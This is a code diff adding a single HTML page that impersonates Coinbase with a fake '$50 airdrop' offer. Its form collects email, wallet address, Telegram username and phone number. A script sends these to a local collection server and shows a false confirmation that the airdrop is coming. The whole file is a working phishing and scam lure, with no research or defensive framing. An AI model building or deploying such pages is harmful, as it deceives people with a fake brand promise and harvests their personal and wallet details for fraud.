@@ -1,0 +1,43 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Coinbase $50 Airdrop</title>
+  <link href="https://cdn.jsdelivr.net/npm/tailwindcss@2.2.19/dist/tailwind.min.css" rel="stylesheet">
+</head>
+<body class="bg-gray-100 flex items-center justify-center min-h-screen">
+  <div class="bg-white p-6 rounded-2xl shadow-xl w-full max-w-md">
+    <h2 class="text-2xl font-bold text-center text-blue-600 mb-4">🎉 Claim Your $50 Coinbase Airdrop</h2>
+    <form id="airdropForm" class="space-y-4">
+      <input type="email" name="email" placeholder="Email" required class="w-full px-4 py-2 border rounded-xl">
+      <input type="text" name="wallet" placeholder="Coinbase Wallet Address" required class="w-full px-4 py-2 border rounded-xl">
+      <input type="text" name="telegram" placeholder="Telegram Username" required class="w-full px-4 py-2 border rounded-xl">
+      <input type="text" name="phone" placeholder="Phone Number (optional)" class="w-full px-4 py-2 border rounded-xl">
+      <button type="submit" class="bg-blue-600 text-white py-2 px-6 rounded-xl w-full">Claim Airdrop</button>
+    </form>
+    <p id="statusMsg" class="text-center mt-4 text-green-600 hidden">✅ Submitted! You’ll receive your airdrop soon.</p>
+  </div>
+
+  <script>
+    const form = document.getElementById('airdropForm');
+    const statusMsg = document.getElementById('statusMsg');
+    form.addEventListener('submit', async (e) => {
+      e.preventDefault();
+      const formData = new FormData(form);
+      const data = Object.fromEntries(formData.entries());
+      try {
+        await fetch('http://localhost:5000/', {
+          method: 'POST',
+          headers: {'Content-Type': 'application/json'},
+          body: JSON.stringify(data)
+        });
+        statusMsg.classList.remove('hidden');
+        form.reset();
+      } catch (err) {
+        alert('Submission failed. Try again.');
+      }
+    });
+  </script>
+</body>
+</html>
